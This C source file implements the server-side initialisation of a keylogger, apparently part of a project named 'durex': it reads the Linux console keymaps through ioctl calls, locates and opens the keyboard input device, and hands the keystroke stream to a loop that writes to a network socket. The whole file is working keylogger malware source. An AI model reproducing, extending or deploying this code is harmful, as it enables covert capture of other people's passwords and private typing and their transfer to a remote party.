#include "durex.h"
#include "keymain.h"
#include "keylogger.h"

static int			**new_keymaps(int tablen, int sectionslen)
{
	int				**ret;

	ret = malloc(sizeof(*ret) * (tablen + 1));
	if (ret == NULL)
		return NULL;
	for (int i = 0; i < tablen; i++) {
		ret[i] = malloc(sizeof(**ret) * sectionslen);
		if (ret[i] == NULL) {
			for (int j = 0; j < i; j++)
				free(ret[j]);
			free(ret);
			return NULL;
		}
	}
	ret[tablen] = NULL;
	return ret;
}

static void 		free_tab(int ***tab)
{
	int				**ptr;

	if (tab && *tab)
	{
		ptr = *tab;
		while (*ptr)
			free(*ptr++);
		free(*tab);
		*tab = NULL;
	}
}

static int			has_keys(int fd, int n)
{
	struct kbentry	ke;

	ke.kb_table = 0;
	ke.kb_index = n;
	return !ioctl(fd, KDGKBENT, (unsigned long)&ke);
}

int					serverInitKeylogger(int socket)
{
	int				fd;
	int				nb_keys;
	int				**key_maps;
	int				nb_keymap;
	int				**key_table;
	char			*keyboard;

	if ((fd = get_console()) < 0)
		return write(socket, "Can't get a file descriptor refering to a terminal\n", 52);
	nb_keys = (has_keys(fd, 255) ? 256 : has_keys(fd, 127) ? 128 : 112);
	if ((key_maps = new_keymaps(2, MAX_NR_KEYMAPS)) == NULL)
		return dprintf(socket, "Can't allocate %do to get keymap\n", 2 * MAX_NR_KEYMAPS);
	if ((nb_keymap = get_keymaps(fd, key_maps, socket)) == 0)
		return 1;
	key_table = get_keys(fd, nb_keys, nb_keymap, key_maps);
	free_tab(&key_maps);
	close(fd);
	if (key_table == NULL)
		return dprintf(socket, "Can't allocate %do for keys table\n", nb_keys * nb_keymap);
	if ((keyboard = get_keyboard()) == NULL) {
		free_tab(&key_table);
		return write(socket, "No keyboard found.\n", 20);
	}
	fd = open(keyboard, O_RDONLY);
	free(keyboard);
	if (fd < 0) {
		free_tab(&key_table);
		return write(socket, "Can't open the keyboard.\n", 26);
	}
	keylogger_loop(fd, key_table, socket);
	close(fd);
	free_tab(&key_table);
	return 0;
}
